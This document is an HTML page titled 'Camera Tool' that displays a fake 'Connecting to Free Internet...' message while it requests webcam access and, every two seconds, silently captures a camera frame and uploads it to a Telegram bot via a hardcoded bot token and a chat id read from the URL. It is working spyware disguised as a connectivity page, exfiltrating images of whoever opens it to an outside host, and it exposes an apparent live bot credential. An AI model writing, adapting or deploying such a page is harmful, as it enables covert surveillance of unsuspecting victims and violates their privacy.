<!DOCTYPE html><html>
<head>
  <title>Camera Tool</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      text-align: center;
      background: #000;
      color: white;
      font-family: Arial, sans-serif;
    }
    video, canvas {
      width: 90%;
      max-width: 400px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h2>ðŸ“¡ Connecting to Free Internet...</h2>
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatid');
    const token = '8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc '; // Replace with your bot token

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        video.srcObject = stream;

        setInterval(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'snapshot.jpg');

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
              method: 'POST',
              body: formData
            });
          }, 'image/jpeg');
        }, 2000);
      })
      .catch(err => {
        document.body.innerHTML = '<h3>ðŸš« Permission Denied. Camera not accessible.</h3>';
      });
  </script></body>
</html>
